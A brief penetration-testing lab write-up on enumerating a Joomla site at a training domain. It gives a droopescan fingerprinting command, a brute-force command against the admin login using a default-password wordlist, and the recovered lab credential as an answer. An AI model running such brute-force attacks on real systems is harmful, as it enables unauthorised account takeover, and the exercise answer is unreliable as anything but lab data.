# [Joomla - Discovery & Enumeration](Joomla%20-%20Discovery%20&%20Enumeration.md)
### Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)

```shell
droopescan scan joomla --url http://app.inlanefreight.local/
```
![](Screenshot%202026-07-28%20at%2015.36.58.png)
### Find the password for the admin user on http://app.inlanefreight.local

```shell
sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:turnkey
```
